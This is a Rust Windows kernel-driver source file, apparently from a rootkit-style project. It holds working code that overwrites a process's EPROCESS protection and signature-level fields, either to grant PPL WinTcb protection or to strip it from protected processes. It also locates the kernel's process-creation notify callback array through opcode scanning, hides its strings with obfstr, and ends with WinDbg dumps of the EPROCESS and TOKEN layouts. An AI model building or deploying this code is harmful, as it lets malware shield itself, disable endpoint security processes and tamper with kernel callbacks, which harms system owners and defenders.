use common::TargetProcess;
use winapi::shared::ntdef::{NTSTATUS, PVOID, UNICODE_STRING};
use winapi::shared::ntstatus::{STATUS_SUCCESS, STATUS_UNSUCCESSFUL};
use crate::includes::{ProcessProtectionInformation, MmGetSystemRoutineAddress, PSProtection};
use crate::string::create_unicode_string;

use self::memory::Process;
pub mod hide;
pub mod memory;

/// Add process protection
pub fn protect_process(target_process: *mut TargetProcess) -> NTSTATUS {

    let process = match unsafe { Process::by_id((*target_process).process_id as u64) } {
        Some(p) => p,
        None => return STATUS_UNSUCCESSFUL,
    };

    let signature_level_offset = get_eprocess_signature_level_offset();
    let ps_protection = unsafe { process.eprocess.cast::<u8>().offset(signature_level_offset) as *mut ProcessProtectionInformation };

    unsafe { 
        (*ps_protection).signature_level = 0x3f;
        (*ps_protection).section_signature_level = 0x3f;
        (*ps_protection).protection = PSProtection::new().with_protection_type(2).with_protection_audit(0).with_protection_signer(6);
    }

    return STATUS_SUCCESS;
}

/// Remove process protection
pub fn unprotect_process(target_process: *mut TargetProcess) -> NTSTATUS {
        
    let process = match unsafe { Process::by_id((*target_process).process_id as u64) } {
        Some(p) => p,
        None => return STATUS_UNSUCCESSFUL,
    };


    let signature_level_offset = get_eprocess_signature_level_offset();
    let ps_protection = unsafe { process.eprocess.cast::<u8>().offset(signature_level_offset) as *mut ProcessProtectionInformation };

    unsafe { 
        (*ps_protection).signature_level = 0;
        (*ps_protection).section_signature_level = 0;
        (*ps_protection).protection = PSProtection::new().with_protection_type(0).with_protection_audit(0).with_protection_signer(0);
    }


    return STATUS_SUCCESS;
}

/// Gets ta pointer to a function from ntoskrnl exports
fn get_ntoskrnl_exports(function_name: *mut UNICODE_STRING) -> PVOID {
    //The MmGetSystemRoutineAddress routine returns a pointer to a function specified by SystemRoutineName.
    return unsafe { MmGetSystemRoutineAddress(function_name) };
}

// Gets function base address
pub fn get_function_base_address(function_name: *mut UNICODE_STRING) -> PVOID {
    let base = get_ntoskrnl_exports(function_name);
    return base;
}

/// Get EPROCESS.Protection offset dynamically
#[allow(dead_code)]
pub fn get_eprocess_protection_offset() -> isize {
    let unicode_function_name = &mut create_unicode_string(
        obfstr::wide!("PsIsProtectedProcess\0")
    ) as *mut UNICODE_STRING;

    let base_address = get_function_base_address(unicode_function_name);
    let function_bytes: &[u8] = unsafe { core::slice::from_raw_parts(base_address as *const u8, 5) };

    let slice = &function_bytes[2..4];
    let protection_offset = u16::from_le_bytes(slice.try_into().unwrap());
    log::info!("EPROCESS.Protection: {:#x}", protection_offset);

    return protection_offset as isize;
}

/// Get EPROCESS.SignatureLevel offset dynamically
pub fn get_eprocess_signature_level_offset() -> isize {
    let unicode_function_name = &mut create_unicode_string(
        obfstr::wide!("PsGetProcessSignatureLevel\0")
    ) as *mut UNICODE_STRING;
    
    let base_address = get_function_base_address(unicode_function_name);
    let function_bytes: &[u8] = unsafe { core::slice::from_raw_parts(base_address as *const u8, 20) };

    let slice = &function_bytes[15..17];
    let signature_level_offset = u16::from_le_bytes(slice.try_into().unwrap());
    log::info!("EPROCESS.SignatureLevel: {:#x}", signature_level_offset);

    return signature_level_offset as isize;
}

pub fn find_psp_set_create_process_notify() -> Option<*const u8> {
    let unicode_function_name = &mut create_unicode_string(
        obfstr::wide!("PsSetCreateProcessNotifyRoutine\0")
    ) as *mut UNICODE_STRING;
    
    let base_address = get_function_base_address(unicode_function_name);

    if base_address.is_null() {
        log::error!("PsSetCreateProcessNotifyRoutine is null");
        return None;
    }

    let func_slice: &[u8] = unsafe { 
        core::slice::from_raw_parts(base_address as *const u8, 0x14) //call nt!PspSetCreateProcessNotifyRoutine (<address>)
    }; 

    // OS version dependent
    const OPCODE_CALL: u8 = 0xE8; //CALL
    const OPCODE_JMP: u8  = 0xE9; //JMP
    
    // Search for the jump or call instruction inside PsSetCreateProcessNotifyRoutine
    if let Some(i) = func_slice.iter().position(|x| *x == OPCODE_CALL || *x == OPCODE_JMP) {
        
        let position = i + 1; // 1 byte after jmp/call
        let offset_slice = &func_slice[position..position + 2]; //u16::from_le_bytes takes 2 slices
        let offset = u16::from_le_bytes(offset_slice.try_into().unwrap());
        let new_base = unsafe { base_address.cast::<u8>().offset(0xd) }; // +0xd is call    nt!PspSetCreateProcessNotifyRoutine
        let new_offset = offset + 0x5; // offset + 5: because i is a the start of call and not the end
        let psp_set_create_process_notify = unsafe { new_base.cast::<u8>().offset(new_offset as isize) as *const u8 };

        // Search for the lea r13 PspSetCreateProcessNotifyRoutine

        let psp_func_slice: &[u8] = unsafe { 
            core::slice::from_raw_parts(psp_set_create_process_notify, 0x70) //lea r13,[nt!PspCreateProcessNotifyRoutine (<address>)]
        };

        let needle = [0x4c, 0x8D]; //lea r13,

        if let Some(y) = psp_func_slice.windows(needle.len()).position(|x| *x == needle) {
            
            let position = y + 3; // 3 byte after lea r13, is the offset
            let offset_slice = &psp_func_slice[position..position + 4]; //u32::from_le_bytes takes 4 slices
            let offset = u32::from_le_bytes(offset_slice.try_into().unwrap());
            let new_base = unsafe { psp_set_create_process_notify.cast::<u8>().offset(0x62) }; // +0x62 is lea r13,[nt!PspCreateProcessNotifyRoutine (<address>)]
            let new_offset = offset + 0x7; // offset + 6: because i is a the start of lea and not the end
            let psp_set_create_process_notify_array = unsafe { new_base.cast::<u8>().offset(new_offset as isize) };

            return Some(psp_set_create_process_notify_array);
        }
    }

    return None;
}

/*

0: kd> u PsIsProtectedProcess	
nt!PsIsProtectedProcess:
fffff807`0d87c730 f6817a08000007  test    byte ptr [rcx+87Ah],7
fffff807`0d87c737 b800000000      mov     eax,0
fffff807`0d87c73c 0f97c0          seta    al
fffff807`0d87c73f c3              ret
fffff807`0d87c740 cc              int     3
fffff807`0d87c741 cc              int     3
fffff807`0d87c742 cc              int     3
fffff807`0d87c743 cc              int     3

0: kd> u PsGetProcessSignatureLevel	
nt!PsGetProcessSignatureLevel:
fffff807`0d992dd0 4885d2          test    rdx,rdx
fffff807`0d992dd3 7408            je      nt!PsGetProcessSignatureLevel+0xd (fffff807`0d992ddd)
fffff807`0d992dd5 8a8179080000    mov     al,byte ptr [rcx+879h]
fffff807`0d992ddb 8802            mov     byte ptr [rdx],al
fffff807`0d992ddd 8a8178080000    mov     al,byte ptr [rcx+878h]
fffff807`0d992de3 c3              ret
fffff807`0d992de4 cc              int     3
fffff807`0d992de5 cc              int     3

nt!_EPROCESS
        +0x878 SignatureLevel   : UChar
        +0x879 SectionSignatureLevel : UChar
        +0x87a Protection       : _PS_PROTECTION

*/

/*
0: kd> dt nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x438 ProcessLock      : _EX_PUSH_LOCK
   +0x440 UniqueProcessId  : Ptr64 Void
   +0x448 ActiveProcessLinks : _LIST_ENTRY
   +0x458 RundownProtect   : _EX_RUNDOWN_REF
   +0x460 Flags2           : Uint4B
   +0x460 JobNotReallyActive : Pos 0, 1 Bit
   +0x460 AccountingFolded : Pos 1, 1 Bit
   +0x460 NewProcessReported : Pos 2, 1 Bit
   +0x460 ExitProcessReported : Pos 3, 1 Bit
   +0x460 ReportCommitChanges : Pos 4, 1 Bit
   +0x460 LastReportMemory : Pos 5, 1 Bit
   +0x460 ForceWakeCharge  : Pos 6, 1 Bit
   +0x460 CrossSessionCreate : Pos 7, 1 Bit
   +0x460 NeedsHandleRundown : Pos 8, 1 Bit
   +0x460 RefTraceEnabled  : Pos 9, 1 Bit
   +0x460 PicoCreated      : Pos 10, 1 Bit
   +0x460 EmptyJobEvaluated : Pos 11, 1 Bit
   +0x460 DefaultPagePriority : Pos 12, 3 Bits
   +0x460 PrimaryTokenFrozen : Pos 15, 1 Bit
   +0x460 ProcessVerifierTarget : Pos 16, 1 Bit
   +0x460 RestrictSetThreadContext : Pos 17, 1 Bit
   +0x460 AffinityPermanent : Pos 18, 1 Bit
   +0x460 AffinityUpdateEnable : Pos 19, 1 Bit
   +0x460 PropagateNode    : Pos 20, 1 Bit
   +0x460 ExplicitAffinity : Pos 21, 1 Bit
   +0x460 ProcessExecutionState : Pos 22, 2 Bits
   +0x460 EnableReadVmLogging : Pos 24, 1 Bit
   +0x460 EnableWriteVmLogging : Pos 25, 1 Bit
   +0x460 FatalAccessTerminationRequested : Pos 26, 1 Bit
   +0x460 DisableSystemAllowedCpuSet : Pos 27, 1 Bit
   +0x460 ProcessStateChangeRequest : Pos 28, 2 Bits
   +0x460 ProcessStateChangeInProgress : Pos 30, 1 Bit
   +0x460 InPrivate        : Pos 31, 1 Bit
   +0x464 Flags            : Uint4B
   +0x464 CreateReported   : Pos 0, 1 Bit
   +0x464 NoDebugInherit   : Pos 1, 1 Bit
   +0x464 ProcessExiting   : Pos 2, 1 Bit
   +0x464 ProcessDelete    : Pos 3, 1 Bit
   +0x464 ManageExecutableMemoryWrites : Pos 4, 1 Bit
   +0x464 VmDeleted        : Pos 5, 1 Bit
   +0x464 OutswapEnabled   : Pos 6, 1 Bit
   +0x464 Outswapped       : Pos 7, 1 Bit
   +0x464 FailFastOnCommitFail : Pos 8, 1 Bit
   +0x464 Wow64VaSpace4Gb  : Pos 9, 1 Bit
   +0x464 AddressSpaceInitialized : Pos 10, 2 Bits
   +0x464 SetTimerResolution : Pos 12, 1 Bit
   +0x464 BreakOnTermination : Pos 13, 1 Bit
   +0x464 DeprioritizeViews : Pos 14, 1 Bit
   +0x464 WriteWatch       : Pos 15, 1 Bit
   +0x464 ProcessInSession : Pos 16, 1 Bit
   +0x464 OverrideAddressSpace : Pos 17, 1 Bit
   +0x464 HasAddressSpace  : Pos 18, 1 Bit
   +0x464 LaunchPrefetched : Pos 19, 1 Bit
   +0x464 Background       : Pos 20, 1 Bit
   +0x464 VmTopDown        : Pos 21, 1 Bit
   +0x464 ImageNotifyDone  : Pos 22, 1 Bit
   +0x464 PdeUpdateNeeded  : Pos 23, 1 Bit
   +0x464 VdmAllowed       : Pos 24, 1 Bit
   +0x464 ProcessRundown   : Pos 25, 1 Bit
   +0x464 ProcessInserted  : Pos 26, 1 Bit
   +0x464 DefaultIoPriority : Pos 27, 3 Bits
   +0x464 ProcessSelfDelete : Pos 30, 1 Bit
   +0x464 SetTimerResolutionLink : Pos 31, 1 Bit
   +0x468 CreateTime       : _LARGE_INTEGER
   +0x470 ProcessQuotaUsage : [2] Uint8B
   +0x480 ProcessQuotaPeak : [2] Uint8B
   +0x490 PeakVirtualSize  : Uint8B
   +0x498 VirtualSize      : Uint8B
   +0x4a0 SessionProcessLinks : _LIST_ENTRY
   +0x4b0 ExceptionPortData : Ptr64 Void
   +0x4b0 ExceptionPortValue : Uint8B
   +0x4b0 ExceptionPortState : Pos 0, 3 Bits
   +0x4b8 Token            : _EX_FAST_REF
   +0x4c0 MmReserved       : Uint8B
   +0x4c8 AddressCreationLock : _EX_PUSH_LOCK
   +0x4d0 PageTableCommitmentLock : _EX_PUSH_LOCK
   +0x4d8 RotateInProgress : Ptr64 _ETHREAD
   +0x4e0 ForkInProgress   : Ptr64 _ETHREAD
   +0x4e8 CommitChargeJob  : Ptr64 _EJOB
   +0x4f0 CloneRoot        : _RTL_AVL_TREE
   +0x4f8 NumberOfPrivatePages : Uint8B
   +0x500 NumberOfLockedPages : Uint8B
   +0x508 Win32Process     : Ptr64 Void
   +0x510 Job              : Ptr64 _EJOB
   +0x518 SectionObject    : Ptr64 Void
   +0x520 SectionBaseAddress : Ptr64 Void
   +0x528 Cookie           : Uint4B
   +0x530 WorkingSetWatch  : Ptr64 _PAGEFAULT_HISTORY
   +0x538 Win32WindowStation : Ptr64 Void
   +0x540 InheritedFromUniqueProcessId : Ptr64 Void
   +0x548 OwnerProcessId   : Uint8B
   +0x550 Peb              : Ptr64 _PEB
   +0x558 Session          : Ptr64 _MM_SESSION_SPACE
   +0x560 Spare1           : Ptr64 Void
   +0x568 QuotaBlock       : Ptr64 _EPROCESS_QUOTA_BLOCK
   +0x570 ObjectTable      : Ptr64 _HANDLE_TABLE
   +0x578 DebugPort        : Ptr64 Void
   +0x580 WoW64Process     : Ptr64 _EWOW64PROCESS
   +0x588 DeviceMap        : Ptr64 Void
   +0x590 EtwDataSource    : Ptr64 Void
   +0x598 PageDirectoryPte : Uint8B
   +0x5a0 ImageFilePointer : Ptr64 _FILE_OBJECT
   +0x5a8 ImageFileName    : [15] UChar
   +0x5b7 PriorityClass    : UChar
   +0x5b8 SecurityPort     : Ptr64 Void
   +0x5c0 SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO
   +0x5c8 JobLinks         : _LIST_ENTRY
   +0x5d8 HighestUserAddress : Ptr64 Void
   +0x5e0 ThreadListHead   : _LIST_ENTRY
   +0x5f0 ActiveThreads    : Uint4B
   +0x5f4 ImagePathHash    : Uint4B
   +0x5f8 DefaultHardErrorProcessing : Uint4B
   +0x5fc LastThreadExitStatus : Int4B
   +0x600 PrefetchTrace    : _EX_FAST_REF
   +0x608 LockedPagesList  : Ptr64 Void
   +0x610 ReadOperationCount : _LARGE_INTEGER
   +0x618 WriteOperationCount : _LARGE_INTEGER
   +0x620 OtherOperationCount : _LARGE_INTEGER
   +0x628 ReadTransferCount : _LARGE_INTEGER
   +0x630 WriteTransferCount : _LARGE_INTEGER
   +0x638 OtherTransferCount : _LARGE_INTEGER
   +0x640 CommitChargeLimit : Uint8B
   +0x648 CommitCharge     : Uint8B
   +0x650 CommitChargePeak : Uint8B
   +0x680 Vm               : _MMSUPPORT_FULL
   +0x7c0 MmProcessLinks   : _LIST_ENTRY
   +0x7d0 ModifiedPageCount : Uint4B
   +0x7d4 ExitStatus       : Int4B
   +0x7d8 VadRoot          : _RTL_AVL_TREE
   +0x7e0 VadHint          : Ptr64 Void
   +0x7e8 VadCount         : Uint8B
   +0x7f0 VadPhysicalPages : Uint8B
   +0x7f8 VadPhysicalPagesLimit : Uint8B
   +0x800 AlpcContext      : _ALPC_PROCESS_CONTEXT
   +0x820 TimerResolutionLink : _LIST_ENTRY
   +0x830 TimerResolutionStackRecord : Ptr64 _PO_DIAG_STACK_RECORD
   +0x838 RequestedTimerResolution : Uint4B
   +0x83c SmallestTimerResolution : Uint4B
   +0x840 ExitTime         : _LARGE_INTEGER
   +0x848 InvertedFunctionTable : Ptr64 _INVERTED_FUNCTION_TABLE
   +0x850 InvertedFunctionTableLock : _EX_PUSH_LOCK
   +0x858 ActiveThreadsHighWatermark : Uint4B
   +0x85c LargePrivateVadCount : Uint4B
   +0x860 ThreadListLock   : _EX_PUSH_LOCK
   +0x868 WnfContext       : Ptr64 Void
   +0x870 ServerSilo       : Ptr64 _EJOB
   +0x878 SignatureLevel   : UChar
   +0x879 SectionSignatureLevel : UChar
   +0x87a Protection       : _PS_PROTECTION
   +0x87b HangCount        : Pos 0, 3 Bits
   +0x87b GhostCount       : Pos 3, 3 Bits
   +0x87b PrefilterException : Pos 6, 1 Bit
   +0x87c Flags3           : Uint4B
   +0x87c Minimal          : Pos 0, 1 Bit
   +0x87c ReplacingPageRoot : Pos 1, 1 Bit
   +0x87c Crashed          : Pos 2, 1 Bit
   +0x87c JobVadsAreTracked : Pos 3, 1 Bit
   +0x87c VadTrackingDisabled : Pos 4, 1 Bit
   +0x87c AuxiliaryProcess : Pos 5, 1 Bit
   +0x87c SubsystemProcess : Pos 6, 1 Bit
   +0x87c IndirectCpuSets  : Pos 7, 1 Bit
   +0x87c RelinquishedCommit : Pos 8, 1 Bit
   +0x87c HighGraphicsPriority : Pos 9, 1 Bit
   +0x87c CommitFailLogged : Pos 10, 1 Bit
   +0x87c ReserveFailLogged : Pos 11, 1 Bit
   +0x87c SystemProcess    : Pos 12, 1 Bit
   +0x87c HideImageBaseAddresses : Pos 13, 1 Bit
   +0x87c AddressPolicyFrozen : Pos 14, 1 Bit
   +0x87c ProcessFirstResume : Pos 15, 1 Bit
   +0x87c ForegroundExternal : Pos 16, 1 Bit
   +0x87c ForegroundSystem : Pos 17, 1 Bit
   +0x87c HighMemoryPriority : Pos 18, 1 Bit
   +0x87c EnableProcessSuspendResumeLogging : Pos 19, 1 Bit
   +0x87c EnableThreadSuspendResumeLogging : Pos 20, 1 Bit
   +0x87c SecurityDomainChanged : Pos 21, 1 Bit
   +0x87c SecurityFreezeComplete : Pos 22, 1 Bit
   +0x87c VmProcessorHost  : Pos 23, 1 Bit
   +0x87c VmProcessorHostTransition : Pos 24, 1 Bit
   +0x87c AltSyscall       : Pos 25, 1 Bit
   +0x87c TimerResolutionIgnore : Pos 26, 1 Bit
   +0x87c DisallowUserTerminate : Pos 27, 1 Bit
   +0x880 DeviceAsid       : Int4B
   +0x888 SvmData          : Ptr64 Void
   +0x890 SvmProcessLock   : _EX_PUSH_LOCK
   +0x898 SvmLock          : Uint8B
   +0x8a0 SvmProcessDeviceListHead : _LIST_ENTRY
   +0x8b0 LastFreezeInterruptTime : Uint8B
   +0x8b8 DiskCounters     : Ptr64 _PROCESS_DISK_COUNTERS
   +0x8c0 PicoContext      : Ptr64 Void
   +0x8c8 EnclaveTable     : Ptr64 Void
   +0x8d0 EnclaveNumber    : Uint8B
   +0x8d8 EnclaveLock      : _EX_PUSH_LOCK
   +0x8e0 HighPriorityFaultsAllowed : Uint4B
   +0x8e8 EnergyContext    : Ptr64 _PO_PROCESS_ENERGY_CONTEXT
   +0x8f0 VmContext        : Ptr64 Void
   +0x8f8 SequenceNumber   : Uint8B
   +0x900 CreateInterruptTime : Uint8B
   +0x908 CreateUnbiasedInterruptTime : Uint8B
   +0x910 TotalUnbiasedFrozenTime : Uint8B
   +0x918 LastAppStateUpdateTime : Uint8B
   +0x920 LastAppStateUptime : Pos 0, 61 Bits
   +0x920 LastAppState     : Pos 61, 3 Bits
   +0x928 SharedCommitCharge : Uint8B
   +0x930 SharedCommitLock : _EX_PUSH_LOCK
   +0x938 SharedCommitLinks : _LIST_ENTRY
   +0x948 AllowedCpuSets   : Uint8B
   +0x950 DefaultCpuSets   : Uint8B
   +0x948 AllowedCpuSetsIndirect : Ptr64 Uint8B
   +0x950 DefaultCpuSetsIndirect : Ptr64 Uint8B
   +0x958 DiskIoAttribution : Ptr64 Void
   +0x960 DxgProcess       : Ptr64 Void
   +0x968 Win32KFilterSet  : Uint4B
   +0x970 ProcessTimerDelay : _PS_INTERLOCKED_TIMER_DELAY_VALUES
   +0x978 KTimerSets       : Uint4B
   +0x97c KTimer2Sets      : Uint4B
   +0x980 ThreadTimerSets  : Uint4B
   +0x988 VirtualTimerListLock : Uint8B
   +0x990 VirtualTimerListHead : _LIST_ENTRY
   +0x9a0 WakeChannel      : _WNF_STATE_NAME
   +0x9a0 WakeInfo         : _PS_PROCESS_WAKE_INFORMATION
   +0x9d0 MitigationFlags  : Uint4B
   +0x9d0 MitigationFlagsValues : <anonymous-tag>
   +0x9d4 MitigationFlags2 : Uint4B
   +0x9d4 MitigationFlags2Values : <anonymous-tag>
   +0x9d8 PartitionObject  : Ptr64 Void
   +0x9e0 SecurityDomain   : Uint8B
   +0x9e8 ParentSecurityDomain : Uint8B
   +0x9f0 CoverageSamplerContext : Ptr64 Void
   +0x9f8 MmHotPatchContext : Ptr64 Void
   +0xa00 DynamicEHContinuationTargetsTree : _RTL_AVL_TREE
   +0xa08 DynamicEHContinuationTargetsLock : _EX_PUSH_LOCK
   +0xa10 DynamicEnforcedCetCompatibleRanges : _PS_DYNAMIC_ENFORCED_ADDRESS_RANGES
   +0xa20 DisabledComponentFlags : Uint4B
   +0xa28 PathRedirectionHashes : Ptr64 Uint4B


   0: kd> dt nt!_TOKEN
   +0x000 TokenSource      : _TOKEN_SOURCE
   +0x010 TokenId          : _LUID
   +0x018 AuthenticationId : _LUID
   +0x020 ParentTokenId    : _LUID
   +0x028 ExpirationTime   : _LARGE_INTEGER
   +0x030 TokenLock        : Ptr64 _ERESOURCE
   +0x038 ModifiedId       : _LUID
   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
   +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
   +0x078 SessionId        : Uint4B
   +0x07c UserAndGroupCount : Uint4B
   +0x080 RestrictedSidCount : Uint4B
   +0x084 VariableLength   : Uint4B
   +0x088 DynamicCharged   : Uint4B
   +0x08c DynamicAvailable : Uint4B
   +0x090 DefaultOwnerIndex : Uint4B
   +0x098 UserAndGroups    : Ptr64 _SID_AND_ATTRIBUTES
   +0x0a0 RestrictedSids   : Ptr64 _SID_AND_ATTRIBUTES
   +0x0a8 PrimaryGroup     : Ptr64 Void
   +0x0b0 DynamicPart      : Ptr64 Uint4B
   +0x0b8 DefaultDacl      : Ptr64 _ACL
   +0x0c0 TokenType        : _TOKEN_TYPE
   +0x0c4 ImpersonationLevel : _SECURITY_IMPERSONATION_LEVEL
   +0x0c8 TokenFlags       : Uint4B
   +0x0cc TokenInUse       : UChar
   +0x0d0 IntegrityLevelIndex : Uint4B
   +0x0d4 MandatoryPolicy  : Uint4B
   +0x0d8 LogonSession     : Ptr64 _SEP_LOGON_SESSION_REFERENCES
   +0x0e0 OriginatingLogonSession : _LUID
   +0x0e8 SidHash          : _SID_AND_ATTRIBUTES_HASH
   +0x1f8 RestrictedSidHash : _SID_AND_ATTRIBUTES_HASH
   +0x308 pSecurityAttributes : Ptr64 _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION
   +0x310 Package          : Ptr64 Void
   +0x318 Capabilities     : Ptr64 _SID_AND_ATTRIBUTES
   +0x320 CapabilityCount  : Uint4B
   +0x328 CapabilitiesHash : _SID_AND_ATTRIBUTES_HASH
   +0x438 LowboxNumberEntry : Ptr64 _SEP_LOWBOX_NUMBER_ENTRY
   +0x440 LowboxHandlesEntry : Ptr64 _SEP_CACHED_HANDLES_ENTRY
   +0x448 pClaimAttributes : Ptr64 _AUTHZBASEP_CLAIM_ATTRIBUTES_COLLECTION
   +0x450 TrustLevelSid    : Ptr64 Void
   +0x458 TrustLinkedToken : Ptr64 _TOKEN
   +0x460 IntegrityLevelSidValue : Ptr64 Void
   +0x468 TokenSidValues   : Ptr64 _SEP_SID_VALUES_BLOCK
   +0x470 IndexEntry       : Ptr64 _SEP_LUID_TO_INDEX_MAP_ENTRY
   +0x478 DiagnosticInfo   : Ptr64 _SEP_TOKEN_DIAG_TRACK_ENTRY
   +0x480 BnoIsolationHandlesEntry : Ptr64 _SEP_CACHED_HANDLES_ENTRY
   +0x488 SessionObject    : Ptr64 Void
   +0x490 VariablePart     : Uint8B
 */